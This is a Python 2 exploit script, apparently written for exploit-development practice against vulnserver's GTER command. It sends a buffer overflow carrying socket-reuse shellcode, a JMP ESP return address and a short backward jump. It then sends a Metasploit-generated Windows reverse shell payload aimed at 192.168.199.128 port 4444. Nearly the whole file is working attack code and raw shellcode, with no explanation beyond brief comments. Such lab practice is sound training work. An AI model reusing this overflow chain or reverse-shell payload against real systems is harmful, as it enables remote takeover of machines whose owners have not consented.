import socket
import struct
import time

print "\nExploitation of GTER Command - Socket Reconstruction\n"

ip_addr = '192.168.199.130'
port = 9999

# send evil buffer to vulnserver
def send_evil_buffer(evil_buffer, ip_addr=ip_addr, port=port):

    did_send = False

    command = evil_buffer[:5]

    print "Sending buffer of length %s to command %s" % (len(evil_buffer), command)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip_addr, int(port)))

    except Exception as e:
        print "[-] Failed to connect to service %s" % e

    else:
        print "[+] Connected to server"

        # Get banner response
        data = s.recv(1024)
        print(data)

        bytes_sent = s.send(evil_buffer)
        print "Sent %s bytes" % bytes_sent

        if bytes_sent > 0:
            did_send = True

    finally:
        s.close()
 
    return did_send

###############################################################################
shellcode = "\x83\xec\x4a\x83\xec\x4a\x31\xc0\xb0\x06\x50\xb0\x01\x50\x40\x50\xbb\xff\x7c\x25\x40\xc1\xeb\x08\xff\xd3\x89\xc7\x31\xc0\x50\x50\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x57\xbb\xff\x64\x25\x40\xc1\xeb\x08\xff\xd3\x6a\x7f\x57\xbb\xff\x54\x25\x40\xc1\xeb\x08\xff\xd3\x31\xc0\x50\x50\x57\xbb\xff\x4c\x25\x40\xc1\xeb\x08\xff\xd3\x89\xc7\x31\xc0\x50\xb4\x02\x50\x54\x59\x66\x83\xc1\x51\x66\x83\xc1\x51\x51\x57\xbb\xff\x2c\x25\x40\xc1\xeb\x08\xff\xd3"

# We need to add a few null bytes at the end to give us room to place our second stage shellcode 
shellcode_buffer = "\x90"*(145-len(shellcode)) + shellcode + '\x90\x90'
print "Shellcode buffer size: %d" % len(shellcode_buffer)

# negative jump 128 bytes -128 is the max we can jump back for a short jump 
jmpshort = '\xeb\x80\x90\x90'

jmp_esp = struct.pack("<I", 0x625011AF)

# Now we can try to send our egghunter shellcode to GTER   
evil_buffer = "GTER /.:/" + shellcode_buffer + jmp_esp + jmpshort + 'E'*(5000-147-4-4)
send_evil_buffer(evil_buffer)

# sleep before sending reverse shell payload
time.sleep(3)

print "Sending Reverse shell payload..."
#msfpayload windows/shell_reverse_tcp LHOST=192.168.199.128 LPORT=4444 EXITFUN=NONE R | msfencode -b '\x00' -t c
revshell = (
"\xbe\x15\x2a\x4f\xf8\xdb\xd2\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x4f\x31\x73\x14\x03\x73\x14\x83\xeb\xfc\xf7\xdf\xb3\x10\x7e"
"\x1f\x4c\xe1\xe0\xa9\xa9\xd0\x32\xcd\xba\x41\x82\x85\xef\x69"
"\x69\xcb\x1b\xf9\x1f\xc4\x2c\x4a\x95\x32\x02\x4b\x18\xfb\xc8"
"\x8f\x3b\x87\x12\xdc\x9b\xb6\xdc\x11\xda\xff\x01\xd9\x8e\xa8"
"\x4e\x48\x3e\xdc\x13\x51\x3f\x32\x18\xe9\x47\x37\xdf\x9e\xfd"
"\x36\x30\x0e\x8a\x71\xa8\x24\xd4\xa1\xc9\xe9\x07\x9d\x80\x86"
"\xf3\x55\x13\x4f\xca\x96\x25\xaf\x80\xa8\x89\x22\xd9\xed\x2e"
"\xdd\xac\x05\x4d\x60\xb6\xdd\x2f\xbe\x33\xc0\x88\x35\xe3\x20"
"\x28\x99\x75\xa2\x26\x56\xf2\xec\x2a\x69\xd7\x86\x57\xe2\xd6"
"\x48\xde\xb0\xfc\x4c\xba\x63\x9d\xd5\x66\xc5\xa2\x06\xce\xba"
"\x06\x4c\xfd\xaf\x30\x0f\x6a\x03\x0e\xb0\x6a\x0b\x19\xc3\x58"
"\x94\xb1\x4b\xd1\x5d\x1f\x8b\x16\x74\xe7\x03\xe9\x77\x17\x0d"
"\x2e\x23\x47\x25\x87\x4c\x0c\xb5\x28\x99\x82\xe5\x86\x72\x62"
"\x56\x67\x23\x0a\xbc\x68\x1c\x2a\xbf\xa2\x2b\x6d\x28\x8d\x84"
"\xb6\x29\x65\xd7\x38\x3b\x2a\x5e\xde\x51\xc2\x36\x49\xce\x7b"
"\x13\x01\x6f\x83\x89\x81\x0c\x16\x56\x51\x5a\x0b\xc1\x06\x0b"
"\xfd\x18\xc2\xa1\xa4\xb2\xf0\x3b\x30\xfc\xb0\xe7\x81\x03\x39"
"\x65\xbd\x27\x29\xb3\x3e\x6c\x1d\x6b\x69\x3a\xcb\xcd\xc3\x8c"
"\xa5\x87\xb8\x46\x21\x51\xf3\x58\x37\x5e\xde\x2e\xd7\xef\xb7"
"\x76\xe8\xc0\x5f\x7f\x91\x3c\xc0\x80\x48\x85\xf0\xca\xd0\xac"
"\x98\x92\x81\xec\xc4\x24\x7c\x32\xf1\xa6\x74\xcb\x06\xb6\xfd"
"\xce\x43\x70\xee\xa2\xdc\x15\x10\x10\xdc\x3f"
) 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_addr, 4444))
bytes_sent = s.send(revshell)
print "Sent %s bytes" % bytes_sent
s.close()
